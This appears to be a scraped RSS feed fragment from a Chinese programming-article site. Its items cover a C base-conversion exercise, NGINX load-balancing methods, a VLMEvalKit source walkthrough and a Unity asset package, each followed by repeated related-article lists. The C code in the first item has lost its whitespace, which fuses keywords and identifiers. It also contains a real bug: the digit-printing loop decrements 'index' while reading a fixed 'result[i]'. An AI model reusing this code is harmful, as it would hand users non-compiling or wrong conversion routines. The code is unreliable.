      <description>首页编程日记开发工具嵌入式服务器运维每日一题——第一百一十八题news/2025/10/31 23:19:26/题目：进制转换合集#pragmaonce#include&lt;stdio.h&gt;#include&lt;ctype.h&gt;#include&lt;stdbool.h&gt;#include&lt;string&gt;/// &lt;summary&gt;/// 将字符串表示的任意进制数转为十进制/// &lt;/summary&gt;/// &lt;param name="str"&gt;字符串&lt;/param&gt;/// &lt;param name="base"&gt;进制基数&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;longstringToDecimal(constchar*str,intbase){longresult=0;intmultiplier=1;intlen=strlen(str);//从字符串末尾开始解析for(inti=len-1;i&gt;=0;i--){charc=tolower(str[i]);//先将当前字符转为小写intdigit=-1;//根据字符计算对应的值if(c&gt;='0'&amp;&amp;c&lt;='9'){// 计算0-9的数字digit=c-'0';//将数字字符转为对应的十进制数字}elseif(base==16&amp;&amp;(c&gt;='a'&amp;&amp;c&lt;='f')){digit=c-'a'+10;//计算大于大于9小于f的字符对应的数字}elseif(c&lt;'0'||(c&gt;'9'&amp;&amp;base!=16)||(base==16&amp;&amp;c&gt;'f')){return0;//出错}//检查是否在有效范围内if(digit&gt;=base){return0;}//累加结果result+=digit*multiplier;//从低位算，第一项均为1，第二项为base^1, 第三项为base^2 , ......multiplier*=base;}returnresult;}/// &lt;summary&gt;/// 将十进制数字转为任意的r进制/// &lt;/summary&gt;/// &lt;param name="num"&gt;数字&lt;/param&gt;/// &lt;param name="r"&gt;进制数&lt;/param&gt;voidconvertToBaseR(intnum,intr){intindex=0;charresult[65];//假设转换后的数字不超过64位//处理num为0的情况if(num==0){printf("0\n");return;}while(num&gt;0){intremainder=num%r;if(remainder&lt;10){result[index++]='0'+remainder;//余数小于10的转成0-9之间的支付}else{result[index++]='A'+(remainder-10);//余数大于10的，将其转成A ~ Z之间的字符}num/=r;//更新num的值}result[index]='\0';//添加字符串末尾结束符//打印for(inti=index-1;index&gt;=0;index--){printf("%c",result[i]);}printf("\n");}http://www.ppmy.cn/news/1540911.html相关文章全面了解 NGINX 的负载均衡算法NGINX 提供多种负载均衡方法&amp;#xff0c;以应对不同的流量分发需求。常用的算法包括&amp;#xff1a;最少连接、最短时间、通用哈希、随机算法和 IP 哈希。这些负载均衡算法都通过独立指令来定义&amp;#xff0c;每种算法都有其独特的应用场景。 以下负载均衡方法&amp;#xff08;IP 哈希除…阅读更多...VLMEvalKit多模态大模型评测工具源码解析vlmeval/api和vlmeval/vlm文件夹下分别是api接口和本地运行的大模型的代码 基类都是base vlmeval/dataset是数据集处理代码 vlmeval/inference.py是推理代码 run.py的整个流程 
1 vlmeval/api/base.py 
主要为需要与外部API交互的系统提供了一个通用的框架 类属性 allowed_type…阅读更多...Support package for Hovl Studio assets 材质转换器编辑器将仅适用于标准渲染管道的着色器替换为所有材质中的自定义管道。 编辑器只能使用Hovl Studio的资源&amp;#xff01; 此资源还包括用于URP&amp;#xff08;LWRP&amp;#xff09;和HDRP 2019.2的失真着色器以及许多有用的着色器。 
下载&amp;#xff1a;​​Unity资源商店链接资源下载链接…阅读更多...绝对差值的和问题分析&amp;#xff1a; 取模操作的位置不正确&amp;#xff1a; 你在计算 result - max_ 之前没有正确处理大数取模&amp;#xff0c;这可能导致数值溢出。  最大差值减少量的计算&amp;#xff1a; 算法中的内部循环效率较低&amp;#xff0c;可以优化。  
优化后的代码&amp;#xff1a; 
我们可以参考官…阅读更多...适合学生党的平价蓝牙耳机有哪些？四款便宜又好的蓝牙耳机盘点在寻找适合学生党的平价蓝牙耳机时&amp;#xff0c;我们总是希望能在有限的预算内找到性能卓越、品质可靠的产品&amp;#xff0c;毕竟&amp;#xff0c;对于学生而言&amp;#xff0c;性价比是选择耳机时的重要考量因素&amp;#xff0c;那么适合学生党的平价蓝牙耳机有哪些&amp;#xff1f;市面上琳琅满目…阅读更多...【人工智能-初级】第6章 决策树和随机森林：浅显易懂的介绍及Python实践文章目录 一、决策树简介二、决策树的构建原理2.1 决策树的优缺点优点缺点 三、随机森林简介3.1 随机森林的构建过程3.2 随机森林的优缺点优点缺点 四、Python实现决策树和随机森林4.1 导入必要的库4.2 加载数据集并进行预处理4.3 创建决策树模型并进行训练4.4 可视化决策树4.5…阅读更多...电子商务网站维护技巧：保持WordPress、主题和插件的更新在这个快节奏的数字时代&amp;#xff0c;维护一个电子商务网站的首要任务之一是保持WordPress、主题和插件的最新状态。过时的软件不仅可能导致功能故障&amp;#xff0c;还可能带来安全风险。本文将深入探讨如何有效地更新和维护您的WordPress网站&amp;#xff0c;以确保其安全性和性能。 
…阅读更多...Dockerfile 中 Expose 命令的作用Dockerfile 中 Expose 命令的作用 
格式是&amp;#xff1a;EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...] 
例如&amp;#xff1a; EXPOSE 8080 8081 8082 
特别注意&amp;#xff1a; 
EXPOSE 指令是声明容器运行时提供服务的端口&amp;#xff0c;请注意这只是一个声明&amp;#xff0c;并没有实际作用&amp;am…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:26 +0000</pubDate>
    </item>
    <item>
      <title>全面了解 NGINX 的负载均衡算法</title>
      <link>https://www.ppmy.cn/news/1540910.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维全面了解 NGINX 的负载均衡算法news/2025/10/31 23:19:25/NGINX 提供多种负载均衡方法，以应对不同的流量分发需求。常用的算法包括：最少连接、最短时间、通用哈希、随机算法和 IP 哈希。这些负载均衡算法都通过独立指令来定义，每种算法都有其独特的应用场景。以下负载均衡方法（IP 哈希除外）适用于 HTTP、TCP 和 UDP 上游池：轮询轮询（Round Robin）是 NGINX 默认的负载均衡方法，按服务器列表的顺序分发请求。此方法适用于所有服务器具有相似性能的场景。加权轮询：如果服务器的处理能力不同，可以通过 weight 参数进行权重设置。权重越高，服务器接收的请求越多。加权轮询的基本原理是通过加权平均值来决定流量分配。最少连接least_conn 方法通过将请求代理到当前连接数最少的服务器，帮助优化资源利用率。它非常适用于处理长时间连接（如 WebSocket）的场景。权重同样可以结合使用，以进一步控制负载分配。最短时间least_time 仅在 NGINX Plus 中提供，是一种更加智能的负载均衡算法。它不仅考虑服务器的连接数，还优先选择响应时间最短的服务器。这种方法特别适合高性能应用，能够帮助减少延迟并提高响应速度。参数设置：用户需指定 header（使用响应头的时间）或 last_byte（使用完整响应的时间）作为优化依据。可选参数 inflight 还可以将未完成的请求考虑在内。通用哈希hash 算法根据管理员定义的哈希值（基于请求的特定文本、变量或两者结合）将请求定向到特定服务器。这种方法在需要请求始终发往同一服务器的场景（如缓存或会话一致性）中非常有用。注意事项：当服务器池发生变化（添加或删除服务器）时，哈希分配会重新计算，因此某些会话可能会重新路由。随机算法random 算法用于在服务器池中随机选择一台服务器处理请求。它支持 weight 参数来影响服务器的选择概率。通过 two [method] 参数，NGINX 可随机选择两台服务器，并使用指定的负载均衡方法（如 least_conn）在这两台服务器间分配请求。IP 哈希ip_hash 仅适用于 HTTP 协议。此方法基于客户端 IP 地址的哈希值，将请求分配到特定服务器。使用此方法可以确保来自同一客户端的请求始终被分发到同一台服务器，特别适合需要维持会话一致性的应用场景。IP 哈希的工作原理：IP 哈希算法使用 IPv4 地址的前三个八位组或完整的 IPv6 地址生成哈希值。这不同于通用哈希算法，后者使用远程变量来生成哈希。最后每种负载均衡算法都有其独特的优势和应用场景，结合需求，合理选择负载均衡方法能够显著提升系统的性能和可用性http://www.ppmy.cn/news/1540910.html相关文章VLMEvalKit多模态大模型评测工具源码解析vlmeval/api和vlmeval/vlm文件夹下分别是api接口和本地运行的大模型的代码 基类都是base vlmeval/dataset是数据集处理代码 vlmeval/inference.py是推理代码 run.py的整个流程 
1 vlmeval/api/base.py 
主要为需要与外部API交互的系统提供了一个通用的框架 类属性 allowed_type…阅读更多...Support package for Hovl Studio assets 材质转换器编辑器将仅适用于标准渲染管道的着色器替换为所有材质中的自定义管道。 编辑器只能使用Hovl Studio的资源&amp;#xff01; 此资源还包括用于URP&amp;#xff08;LWRP&amp;#xff09;和HDRP 2019.2的失真着色器以及许多有用的着色器。 
下载&amp;#xff1a;​​Unity资源商店链接资源下载链接…阅读更多...绝对差值的和问题分析&amp;#xff1a; 取模操作的位置不正确&amp;#xff1a; 你在计算 result - max_ 之前没有正确处理大数取模&amp;#xff0c;这可能导致数值溢出。  最大差值减少量的计算&amp;#xff1a; 算法中的内部循环效率较低&amp;#xff0c;可以优化。  
优化后的代码&amp;#xff1a; 
我们可以参考官…阅读更多...适合学生党的平价蓝牙耳机有哪些？四款便宜又好的蓝牙耳机盘点在寻找适合学生党的平价蓝牙耳机时&amp;#xff0c;我们总是希望能在有限的预算内找到性能卓越、品质可靠的产品&amp;#xff0c;毕竟&amp;#xff0c;对于学生而言&amp;#xff0c;性价比是选择耳机时的重要考量因素&amp;#xff0c;那么适合学生党的平价蓝牙耳机有哪些&amp;#xff1f;市面上琳琅满目…阅读更多...【人工智能-初级】第6章 决策树和随机森林：浅显易懂的介绍及Python实践文章目录 一、决策树简介二、决策树的构建原理2.1 决策树的优缺点优点缺点 三、随机森林简介3.1 随机森林的构建过程3.2 随机森林的优缺点优点缺点 四、Python实现决策树和随机森林4.1 导入必要的库4.2 加载数据集并进行预处理4.3 创建决策树模型并进行训练4.4 可视化决策树4.5…阅读更多...电子商务网站维护技巧：保持WordPress、主题和插件的更新在这个快节奏的数字时代&amp;#xff0c;维护一个电子商务网站的首要任务之一是保持WordPress、主题和插件的最新状态。过时的软件不仅可能导致功能故障&amp;#xff0c;还可能带来安全风险。本文将深入探讨如何有效地更新和维护您的WordPress网站&amp;#xff0c;以确保其安全性和性能。 
…阅读更多...Dockerfile 中 Expose 命令的作用Dockerfile 中 Expose 命令的作用 
格式是&amp;#xff1a;EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...] 
例如&amp;#xff1a; EXPOSE 8080 8081 8082 
特别注意&amp;#xff1a; 
EXPOSE 指令是声明容器运行时提供服务的端口&amp;#xff0c;请注意这只是一个声明&amp;#xff0c;并没有实际作用&amp;am…阅读更多...中阳金融市场中的风险管理与投资优化策略在全球经济波动性不断加剧的背景下&amp;#xff0c;金融市场的复杂性与不确定性显著增加。作为国际金融市场中的重要组成部分&amp;#xff0c;中阳金融市场吸引了大量投资者的关注。面对风险与机遇并存的市场环境&amp;#xff0c;如何合理制定风险管理与投资优化策略&amp;#xff0c;成为投资者…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:26 +0000</pubDate>
    </item>
    <item>
      <title>VLMEvalKit多模态大模型评测工具源码解析</title>
      <link>https://www.ppmy.cn/news/1540909.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维VLMEvalKit多模态大模型评测工具源码解析news/2025/10/31 23:19:24/vlmeval/api和vlmeval/vlm文件夹下分别是api接口和本地运行的大模型的代码 基类都是basevlmeval/dataset是数据集处理代码vlmeval/inference.py是推理代码run.py的整个流程1 vlmeval/api/base.py主要为需要与外部API交互的系统提供了一个通用的框架类属性allowed_types：定义了API允许处理的数据类型（在本例中是text和image）。INTERLEAVE：一个布尔值，表示是否允许文本和图片的交错输入（例如，某些API可能允许同时传入文本和图片）。INSTALL_REQ：是否需要额外安装API运行时的依赖，默认为 False。初始化方法 (init)这个方法负责初始化类实例时的配置，主要参数如下：retry：表示如果调用API失败，最多重试的次数（默认10次）。wait：表示在每次失败后需要等待的时间（默认3秒）。system_prompt：用于配置系统提示符（如果有的话），可以在调用API时携带给模型的上下文提示。verbose：控制是否打印详细的调试信息。fail_msg：当API调用失败时，返回的错误信息。此外，它还初始化了一个日志记录器 logger，用于记录调试和错误信息。其中self.data = data为pd.read_csv加载的数据[7299 rows x 11 columns]经过处理后如下所示 只有2行数据index questionhint AB … D categoryimage l2-category split 0 243 识别出艾琳的实验能最好回答的问题。下面的文章描述了一个实验。阅读文章，然后按照以下说明进行操作。\n\n艾琳将番茄和西兰花植物…蛞蝓会从番茄叶子上吃更多还是从西兰花叶子上吃更多？ 蛞蝓在吃了番茄叶子或西兰花叶子后会更重吗？ … NaNidentity_reasoning /9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBw…attribute_reasoning test 1 245 请确定Josh和Mark的实验最能回答的问题是什么。下面的文章描述了一个实验。阅读文章，然后按照以下说明进行操作。\n\n乔什将一个乒乓球放在弹…乒乓球从30¬∞角度或45¬∞角度发射后，是否更快停止在地面上滚动？ 与从45¬∞角度发射相比，乒乓球从30¬∞角度发射是否能飞得更远？… NaN identity_reasoning/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBw… attribute_reasoningtest[2 rows x 11 columns]抽象方法 generate_inner这是一个抽象方法，具体的API子类需要实现这个方法来完成与实际API的交互。该方法会返回三个结果：ret_code：返回码，表示成功 (0) 或失败的状态。answer：API返回的实际答案。log：用于记录过程日志。此方法的设计确保了所有API子类都要实现自己的生成逻辑。工作状态检测 (working)这个方法用于检测API是否工作正常。它会尝试发送简单的输入（如"hello"），如果能够正常返回非空响应且不包含失败信息，则认为API是正常工作的。它也带有超时处理（timeout），以确保在API响应过慢时能够自动调整超时时间。输入检查 (check_content)该方法用于检查输入数据的类型，支持的类型有字符串 (str)、字典 (dict)、字符串列表 (liststr) 和字典列表 (listdict)。它能够检测传入的数据格式是否符合API的要求。例如，当输入是 str 时，它会被识别为 text 类型；当输入是字典时，则需要检查其中是否有 type 和 value 字段。内容预处理 (preproc_content)这个方法将原始输入转换为可以供API使用的格式（一般是字典列表）。它会对输入进行解析和判断，将其转换成API可以理解的标准格式（如type和value键值对）。如果输入是文件路径，它会尝试通过 parse_file 函数来识别文件的类型（如文本文件或图片），并将其解析为相应的内容。聊天功能 (chat 和 chat_inner)chat 方法用于处理多轮对话，传入的 messages 参数是一个多轮会话消息的列表。这个方法会调用 chat_inner，它是主要的聊天核心逻辑。在 chat_inner 中，如果一次生成请求失败，会递归地减少输入的上下文长度，直到找到可以生成响应的输入。通过这种递归方式，可以避免因为上下文长度过长而导致的生成失败问题。生成功能 (generate)generate 是主要的生成方法，它调用 generate_inner 来生成答案。它首先会对输入进行类型检查和预处理，确保输入符合API的要求。通过重试机制，多次尝试调用API并处理失败情况。它还会通过随机延迟 (rd.random() 产生0-0.5秒的随机延迟) 来模拟真实环境中调用API的行为。图片处理 (message_to_promptimg)该方法用于处理包含图片的输入消息。它会从消息列表中提取图片和文本，然后将其组织为适合API使用的格式（如拼接多个图片）。如果API不支持交错输入图片和文本，它会发出警告，并仅使用第一个图片和所有文本作为输入。2 vlmeval/dataset/image_base.py从远程地址下载数据集、解析数据集、处理图像（如加载、解码、存储），并准备好数据供模型或API使用。提供了对数据集的图像处理、数据预处理、提示构建（build_prompt），以及评估功能的接口（evaluate 需要子类实现）类属性MODALITY = ‘IMAGE’：该类处理的主要模式是图像，这意味着它专注于图像相关的数据处理。DATASET_URL：用于存储每个数据集的下载地址。DATASET_MD5：用于存储每个数据集的MD5哈希值，用于校验数据集文件的完整性。初始化方法 (init)dataset：指定要使用的数据集的名称，默认为 MMBench。skip_noimg：是否跳过没有图像的数据记录（默认为 True）。如果数据集中有些条目缺少图像，这些条目将被跳过。img_root：图像保存的路径，通过 img_root_map(dataset) 获取具体路径。初始化时，调用了 load_data 来加载数据集，具体内容包括：加载数据并检查图像字段是否为空，跳过没有图像的数据（如果 skip_noimg=True）。将图像和索引字段转换为字符串，以便处理和存储。设置 meta_only 标志，表明是否只处理元数据（如图像的路径，而非图像本身）。3.len和getitemlen：返回数据集的长度，供数据迭代时使用。getitem：根据索引返回数据集中的某一条记录，返回的是一个包含数据记录的字典形式。4. 准备TSV文件 (prepare_tsv)这个方法负责从远程URL下载数据集，支持文件的MD5校验，以确保下载的文件没有损坏或被篡改。如果文件大小超过1GB，还会调用 LOCALIZE 方法进行本地化处理（如文件分割）。load：加载并返回TSV文件的数据。5. 图像处理功能dump_image：这个方法负责将数据中的图像部分存储到本地磁盘。如果图像是Base64编码，它会将其解码并存储为图像文件。它支持处理单张或多张图像，并返回图像的文件路径。display：显示数据记录中的图像或文本信息，依赖外部的 mmqa_display 方法来实现具体的展示功能。可以通过索引或直接传入数据记录来调用此方法。支持的数据集 (supported_datasets)这是一个类方法，返回该类支持的数据集名称列表（通过 DATASET_URL 字典来定义）。加载数据集 (load_data)该方法根据给定的数据集名称，下载并加载数据。具体实现是调用 prepare_tsv 来下载并加载TSV格式的数据集文件。构建提示信息 (build_prompt)该方法根据给定的数据记录生成多模态提示信息（即包含图像和文本的输入）。对于图像，先通过 dump_image 方法获取图像的存储路径，然后将图像与对应的问题一起打包成消息列表（msgs），供模型或API调用时使用。评估方法 (evaluate)这是一个抽象方法，必须在子类中实现，用于根据给定的预测文件对模型的表现进行评估。其输入通常是一个预测文件和其他可选参数（judge_kwargs），返回值可以是字典或 pandas DataFrame。钩子函数 (post_build)该方法是一个钩子函数，允许子类在数据集加载完成后执行特定的操作。子类可以通过重写这个方法，在数据加载完成后进行额外的处理3 vlmeval/dataset/image_mcq.pyImageMCQDataset 类是继承自 ImageBaseDataset 的一个具体实现类，专注于处理包含多项选择问题（MCQ，Multiple Choice Questions）的图像数据集。该类添加了特定于多项选择问题的功能，如生成问题选项提示、处理提示中的答案选项，以及提供专门的评估函数来计算模型的准确性。3.1 类属性TYPE = ‘MCQ’：这个类的类型标识为 MCQ，即多项选择问题类型的数据集。DATASET_URL 和 DATASET_MD5：这些字典存储了不同数据集的下载链接以及对应的MD5哈希值，用于下载和校验数据文件。这里定义了几个用于下载MMBench数据集的链接，并将外部定义的 MMMB_URLS 和 MTL_MMBench_URLS 字典更新到其中，使得类可以支持更多数据集。3.2 build_prompt 方法这个方法负责构建用于模型推理的提示信息，特别是多模态（图像+文本）问题中的多项选择题。输入：line 是数据集中的一条记录，可以是一个索引（int）或是一个具体的数据条目（字典或pandas行）。功能：图像处理：通过 self.dump_image(line) 函数处理图像部分，如果记录包含多个图像，会把它们转换成相应的文件路径。问题和选项构建：从 line 中提取问题文本，并生成对应的选项。选项通过字母（如 A, B, C 等）进行标识，函数会根据选项生成一个提示字符串，包含问题、选项和提示（如果有的话）。返回：返回一个包含图像和文本的消息列表（msgs），这个列表是供多模态模型输入的格式，通常每个消息是一个字典，包含 type 和 value 两个字段。其中tgt_path = self.dump_image(line)#‘/LMUData/images/MMBench_V11/243.jpg’返回的msgs的值如下[{‘type’: ‘image’, ‘value’: ‘/LMUData/images/MMBench_V11/243.jpg’}, {‘type’: ‘text’, ‘value’: ‘Hint: 下面的文章描述了一个实验。阅读文章，然后按照以下说明进行操作。\n\n艾琳将番茄和西兰花植物的叶子切成一英寸的正方形。在12个容器中，她放置了六个叶子正方形：三个番茄叶子正方形和三个西兰花叶子正方形。她在每个容器中放入一只来自她花园的蛞蝓。两天后，艾琳测量了每个叶子正方形被蛞蝓吃掉的数量。她比较了番茄叶子正方形被吃掉的数量与西兰花叶子正方形被吃掉的数量。\n图：一只蛞蝓在一片叶子上。\nQuestion: 识别出艾琳的实验能最好回答的问题。\nOptions:\nA. 蛞蝓会从番茄叶子上吃更多还是从西兰花叶子上吃更多？\nB. 蛞蝓在吃了番茄叶子或西兰花叶子后会更重吗？\nPlease select the correct answer from the options above. \n’}]3.3 decode_base64_to_image_file 方法defdecode_base64_to_image(base64_string,target_size=-1):image_data=base64.b64decode(base64_string)image=Image.open(io.BytesIO(image_data))ifimage.modein('RGBA','P'):image=image.convert('RGB')iftarget_size&gt;0:image.thumbnail((target_size,target_size))returnimage该函数用于将 Base64 编码的图像字符串解码为PIL.Image图像对象，同时根据需要调整图像的大小。Base64 解码：image_data=base64.b64decode(base64_string)使用base64.b64decode将 Base64 编码的图像字符串解码为二进制数据（image_data）。生成图像对象：image=Image.open(io.BytesIO(image_data))使用PIL.Image.open方法将二进制数据转换为图像对象。这里通过io.BytesIO将二进制数据封装成类似文件对象的流，供Image.open读取。模式转换：ifimage.modein('RGBA','P'):image=image.convert('RGB')如果图像的模式是RGBA（带透明度的 RGB 图像）或P（调色板模式的图像），将其转换为标准的RGB模式。这一步通常用于确保图像保存时兼容更多格式。调整图像大小：iftarget_size&gt;0:image.thumbnail((target_size,target_size))http://www.ppmy.cn/news/1540909.html相关文章Support package for Hovl Studio assets 材质转换器编辑器将仅适用于标准渲染管道的着色器替换为所有材质中的自定义管道。 编辑器只能使用Hovl Studio的资源&amp;#xff01; 此资源还包括用于URP&amp;#xff08;LWRP&amp;#xff09;和HDRP 2019.2的失真着色器以及许多有用的着色器。 
下载&amp;#xff1a;​​Unity资源商店链接资源下载链接…阅读更多...绝对差值的和问题分析&amp;#xff1a; 取模操作的位置不正确&amp;#xff1a; 你在计算 result - max_ 之前没有正确处理大数取模&amp;#xff0c;这可能导致数值溢出。  最大差值减少量的计算&amp;#xff1a; 算法中的内部循环效率较低&amp;#xff0c;可以优化。  
优化后的代码&amp;#xff1a; 
我们可以参考官…阅读更多...适合学生党的平价蓝牙耳机有哪些？四款便宜又好的蓝牙耳机盘点在寻找适合学生党的平价蓝牙耳机时&amp;#xff0c;我们总是希望能在有限的预算内找到性能卓越、品质可靠的产品&amp;#xff0c;毕竟&amp;#xff0c;对于学生而言&amp;#xff0c;性价比是选择耳机时的重要考量因素&amp;#xff0c;那么适合学生党的平价蓝牙耳机有哪些&amp;#xff1f;市面上琳琅满目…阅读更多...【人工智能-初级】第6章 决策树和随机森林：浅显易懂的介绍及Python实践文章目录 一、决策树简介二、决策树的构建原理2.1 决策树的优缺点优点缺点 三、随机森林简介3.1 随机森林的构建过程3.2 随机森林的优缺点优点缺点 四、Python实现决策树和随机森林4.1 导入必要的库4.2 加载数据集并进行预处理4.3 创建决策树模型并进行训练4.4 可视化决策树4.5…阅读更多...电子商务网站维护技巧：保持WordPress、主题和插件的更新在这个快节奏的数字时代&amp;#xff0c;维护一个电子商务网站的首要任务之一是保持WordPress、主题和插件的最新状态。过时的软件不仅可能导致功能故障&amp;#xff0c;还可能带来安全风险。本文将深入探讨如何有效地更新和维护您的WordPress网站&amp;#xff0c;以确保其安全性和性能。 
…阅读更多...Dockerfile 中 Expose 命令的作用Dockerfile 中 Expose 命令的作用 
格式是&amp;#xff1a;EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...] 
例如&amp;#xff1a; EXPOSE 8080 8081 8082 
特别注意&amp;#xff1a; 
EXPOSE 指令是声明容器运行时提供服务的端口&amp;#xff0c;请注意这只是一个声明&amp;#xff0c;并没有实际作用&amp;am…阅读更多...中阳金融市场中的风险管理与投资优化策略在全球经济波动性不断加剧的背景下&amp;#xff0c;金融市场的复杂性与不确定性显著增加。作为国际金融市场中的重要组成部分&amp;#xff0c;中阳金融市场吸引了大量投资者的关注。面对风险与机遇并存的市场环境&amp;#xff0c;如何合理制定风险管理与投资优化策略&amp;#xff0c;成为投资者…阅读更多...PP-ChatOCRv3—文档场景信息抽取v3产线使用教程文档场景信息抽取v3产线使用教程 
1. 文档场景信息抽取v3产线介绍 
文档场景信息抽取v3&amp;#xff08;PP-ChatOCRv3&amp;#xff09;是飞桨特色的文档和图像智能分析解决方案&amp;#xff0c;结合了 LLM 和 OCR 技术&amp;#xff0c;一站式解决版面分析、生僻字、多页 pdf、表格、印章识别等常…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:24 +0000</pubDate>
    </item>
    <item>
      <title>Support package for Hovl Studio assets 材质转换器</title>
      <link>https://www.ppmy.cn/news/1540908.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Support package for Hovl Studio assets 材质转换器news/2025/10/31 23:19:23/编辑器将仅适用于标准渲染管道的着色器替换为所有材质中的自定义管道。编辑器只能使用Hovl Studio的资源！此资源还包括用于URP（LWRP）和HDRP 2019.2+的失真着色器以及许多有用的着色器。下载：​​Unity资源商店链接资源下载链接效果图：http://www.ppmy.cn/news/1540908.html相关文章绝对差值的和问题分析&amp;#xff1a; 取模操作的位置不正确&amp;#xff1a; 你在计算 result - max_ 之前没有正确处理大数取模&amp;#xff0c;这可能导致数值溢出。  最大差值减少量的计算&amp;#xff1a; 算法中的内部循环效率较低&amp;#xff0c;可以优化。  
优化后的代码&amp;#xff1a; 
我们可以参考官…阅读更多...适合学生党的平价蓝牙耳机有哪些？四款便宜又好的蓝牙耳机盘点在寻找适合学生党的平价蓝牙耳机时&amp;#xff0c;我们总是希望能在有限的预算内找到性能卓越、品质可靠的产品&amp;#xff0c;毕竟&amp;#xff0c;对于学生而言&amp;#xff0c;性价比是选择耳机时的重要考量因素&amp;#xff0c;那么适合学生党的平价蓝牙耳机有哪些&amp;#xff1f;市面上琳琅满目…阅读更多...【人工智能-初级】第6章 决策树和随机森林：浅显易懂的介绍及Python实践文章目录 一、决策树简介二、决策树的构建原理2.1 决策树的优缺点优点缺点 三、随机森林简介3.1 随机森林的构建过程3.2 随机森林的优缺点优点缺点 四、Python实现决策树和随机森林4.1 导入必要的库4.2 加载数据集并进行预处理4.3 创建决策树模型并进行训练4.4 可视化决策树4.5…阅读更多...电子商务网站维护技巧：保持WordPress、主题和插件的更新在这个快节奏的数字时代&amp;#xff0c;维护一个电子商务网站的首要任务之一是保持WordPress、主题和插件的最新状态。过时的软件不仅可能导致功能故障&amp;#xff0c;还可能带来安全风险。本文将深入探讨如何有效地更新和维护您的WordPress网站&amp;#xff0c;以确保其安全性和性能。 
…阅读更多...Dockerfile 中 Expose 命令的作用Dockerfile 中 Expose 命令的作用 
格式是&amp;#xff1a;EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...] 
例如&amp;#xff1a; EXPOSE 8080 8081 8082 
特别注意&amp;#xff1a; 
EXPOSE 指令是声明容器运行时提供服务的端口&amp;#xff0c;请注意这只是一个声明&amp;#xff0c;并没有实际作用&amp;am…阅读更多...中阳金融市场中的风险管理与投资优化策略在全球经济波动性不断加剧的背景下&amp;#xff0c;金融市场的复杂性与不确定性显著增加。作为国际金融市场中的重要组成部分&amp;#xff0c;中阳金融市场吸引了大量投资者的关注。面对风险与机遇并存的市场环境&amp;#xff0c;如何合理制定风险管理与投资优化策略&amp;#xff0c;成为投资者…阅读更多...PP-ChatOCRv3—文档场景信息抽取v3产线使用教程文档场景信息抽取v3产线使用教程 
1. 文档场景信息抽取v3产线介绍 
文档场景信息抽取v3&amp;#xff08;PP-ChatOCRv3&amp;#xff09;是飞桨特色的文档和图像智能分析解决方案&amp;#xff0c;结合了 LLM 和 OCR 技术&amp;#xff0c;一站式解决版面分析、生僻字、多页 pdf、表格、印章识别等常…阅读更多...简单易用的分类任务开源项目 ：classification项目地址&amp;#xff1a;https://gitcode.net/EricLee/classification 
